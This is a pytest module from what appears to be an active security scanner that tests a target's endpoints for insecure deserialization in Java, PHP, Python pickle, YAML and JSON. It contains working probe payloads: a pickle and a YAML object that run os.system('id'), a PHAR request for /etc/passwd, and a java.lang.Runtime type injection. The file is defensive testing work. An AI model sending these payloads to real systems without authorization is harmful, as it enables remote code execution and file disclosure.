"""Category 22: Insecure Deserialization — Java, PHP, Python object injection."""
import re
import pytest
import base64

from tests.active.helpers import safe_get, safe_post, url_join
from tests.active.config import TARGET_URL

# Serialized object magic bytes/signatures
JAVA_SERIALIZATION = b"\xac\xed\x00\x05"  # Java serialization magic
PHP_SERIALIZATION_PATTERN = re.compile(r"^O:\d+:\"[^\"]+\"|^a:\d+:{")
PYTHON_PICKLE_PATTERN = re.compile(r"^(gAN|gAIV|gB|gA==)", re.IGNORECASE)  # pickle magic in base64

COMMON_DESERIALIZATION_ENDPOINTS = [
    "/api/restore", "/api/import", "/api/load", "/api/data",
    "/callback", "/webhook", "/process", "/execute",
    "/api/config", "/settings/import", "/user/profile"
]

GADGET_CHAIN_INDICATORS = [
    "Apache Commons Collections",
    "Spring Framework",
    "ROME RSS",
    "Groovy",
    "javax.xml",
    "java.beans",
]


class TestJavaDeserialization:
    def test_java_serialization_magic_detection(self):
        """Test endpoints that accept base64-encoded Java objects."""
        for path in COMMON_DESERIALIZATION_ENDPOINTS:
            # Craft minimal Java serialization payload
            java_magic_b64 = base64.b64encode(JAVA_SERIALIZATION).decode()
            r = safe_post(url_join(path),
                          json={"data": java_magic_b64},
                          headers={"Content-Type": "application/json"})
            if r is None or r.status_code == 404:
                continue
            # If the server processes Java serialized data, it may crash or error
            if r.status_code == 500:
                pytest.fail(f"Java deserialization processing at {path}: 500 error on serialized input")

    def test_java_gadget_chain_indicators(self):
        """Check for gadget chain libraries in responses."""
        r = safe_get(TARGET_URL)
        if r is None:
            pytest.skip("target unreachable")
        for lib in GADGET_CHAIN_INDICATORS:
            if lib.lower() in r.text.lower():
                pytest.skip(
                    f"Potential gadget chain library detected: {lib} — "
                    "deserialization RCE may be possible. Test with ysoserial."
                )


class TestPhpDeserialization:
    def test_php_serialized_object_detection(self):
        """Test endpoints accepting PHP serialized objects."""
        for path in COMMON_DESERIALIZATION_ENDPOINTS:
            # PHP serialized empty object: O:8:"stdClass":0:{}
            php_payload = 'O:8:"stdClass":0:{}'
            r = safe_post(url_join(path),
                          data={"data": php_payload},
                          headers={"Content-Type": "application/x-www-form-urlencoded"})
            if r is None or r.status_code == 404:
                continue
            # PHP unserialize() may trigger __wakeup() or other magic methods
            if r.status_code == 500 or "Warning" in r.text:
                pytest.fail(f"PHP deserialization processing at {path}: error on serialized object")

    def test_php_phar_wrapper_ssrf(self):
        """Test for PHAR protocol wrapper exploitation via deserialization."""
        for path in COMMON_DESERIALIZATION_ENDPOINTS:
            r = safe_post(url_join(path),
                          data={"file": "phar:///etc/passwd"},
                          headers={"Content-Type": "application/x-www-form-urlencoded"})
            if r and ("root:" in r.text or "Permission denied" in r.text):
                pytest.fail(f"PHAR wrapper processed at {path}: file disclosure or error")


class TestPythonPickleDeserialization:
    def test_python_pickle_base64_detection(self):
        """Test for Python pickle deserialization via base64."""
        for path in COMMON_DESERIALIZATION_ENDPOINTS:
            # Minimal pickle payload (base64 encoded): `pickle.loads(b'cposix\nsystem\n(S\'id\'\ntR.')`
            # This is represented as cos\nsystem\n in pickle protocol
            pickle_b64 = base64.b64encode(b"cos\nsystem\n(S'id'\ntR.").decode()
            r = safe_post(url_join(path),
                          json={"pickle": pickle_b64},
                          headers={"Content-Type": "application/json"})
            if r is None or r.status_code == 404:
                continue
            if r.status_code in (500, 502) or "uid=" in r.text:
                pytest.fail(f"Python pickle deserialization at {path}: RCE indicator")

    def test_python_yaml_deserialization(self):
        """Test for YAML deserialization vulnerabilities (unsafe_load)."""
        for path in COMMON_DESERIALIZATION_ENDPOINTS:
            yaml_payload = "!!python/object/apply:os.system\nargs: ['id']"
            r = safe_post(url_join(path),
                          data=yaml_payload,
                          headers={"Content-Type": "application/yaml"})
            if r is None or r.status_code == 404:
                continue
            if "uid=" in r.text or r.status_code == 500:
                pytest.fail(f"YAML deserialization RCE at {path}")


class TestJsonDeserialization:
    def test_json_polymorphic_deserialization(self):
        """Test for JSON polymorphic deserialization bypasses."""
        for path in COMMON_DESERIALIZATION_ENDPOINTS:
            # Try to inject class type hint in JSON
            payload = '{"@type":"java.lang.Runtime","@value":"id"}'
            r = safe_post(url_join(path),
                          data=payload,
                          headers={"Content-Type": "application/json"})
            if r is None or r.status_code == 404:
                continue
            if r.status_code == 500 or "Runtime" in r.text:
                pytest.fail(f"JSON polymorphic deserialization at {path}")


class TestDeserializationSkipped:
    def test_active_gadget_chain_is_destructive(self):
        pytest.skip(
            "Active gadget chain exploitation is DESTRUCTIVE and may execute code. "
            "Use ysoserial, phpggc, or pickle generation tools in controlled environments. "
            "See tests/destructive/ for authorized RCE testing."
        )
